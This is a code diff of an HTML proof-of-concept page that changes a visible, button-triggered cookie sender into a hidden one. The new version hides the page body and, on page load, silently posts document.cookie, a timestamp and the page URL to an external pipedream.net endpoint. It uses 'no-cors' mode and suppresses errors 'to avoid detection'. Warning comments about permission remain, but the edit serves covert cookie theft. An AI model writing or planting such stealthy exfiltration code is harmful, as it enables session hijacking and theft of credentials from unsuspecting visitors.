@@ -3,48 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Sending PoC</title>
+    <title>Hidden Cookie PoC</title>
+    <!-- No visible content to keep it stealthy -->
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        #output {
-            margin-top: 20px;
-            color: green;
-        }
-        #error {
-            margin-top: 20px;
-            color: red;
+            display: none; /* Hide everything */
         }
     </style>
 </head>
 <body>
-    <h1>Cookie Sending PoC</h1>
-    <p>This demo captures real cookies and sends them to a test server. Use only with explicit permission!</p>
-    <button onclick="sendCookies()">Send Real Cookies</button>
-    <div id="output"></div>
-    <div id="error"></div>
+    <!-- No UI elements; everything is hidden -->
 
     <script>
-        // WARNING: This code captures REAL cookies and sends them to an external server.
+        // WARNING: This code AUTOMATICALLY captures REAL cookies and sends them to an external server.
         // ONLY use this on systems YOU OWN or have WRITTEN PERMISSION to test.
-        // Unauthorized cookie theft is ILLEGAL and can lead to serious consequences.
-        function sendCookies() {
+        // Unauthorized cookie theft is ILLEGAL and can lead to CRIMINAL charges.
+        // Ensure you control https://eoy4evvlsf7y0jq.m.pipedream.net/ to avoid data leaks.
+        (function() {
             // Capture real cookies
             const realCookies = document.cookie || "No cookies found";
 
-            // Display what's being sent (for transparency)
-            document.getElementById("output").innerText = 
-                "Preparing to send cookies: " + realCookies;
-
-            // Send cookies to the provided URL
+            // Immediately send cookies to the specified URL
             fetch("https://eoy4evvlsf7y0jq.m.pipedream.net/", {
                 method: "POST",
                 headers: {
@@ -52,22 +31,16 @@
                 },
                 body: JSON.stringify({
                     cookies: realCookies,
-                    timestamp: new Date().toISOString()
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    document.getElementById("output").innerText = 
-                        "Cookies sent successfully: " + realCookies;
-                } else {
-                    throw new Error("Server responded with status: " + response.status);
-                }
+                    timestamp: new Date().toISOString(),
+                    source: window.location.href // Optional: track origin
+                }),
+                mode: "no-cors" // Bypass CORS for stealth (may limit server response)
             })
             .catch(error => {
-                document.getElementById("error").innerText = 
-                    "Error sending cookies: " + error.message;
+                // Silently handle errors to avoid detection
+                console.error("Error sending cookies:", error);
             });
-        }
+        })();
     </script>
 </body>
 </html>
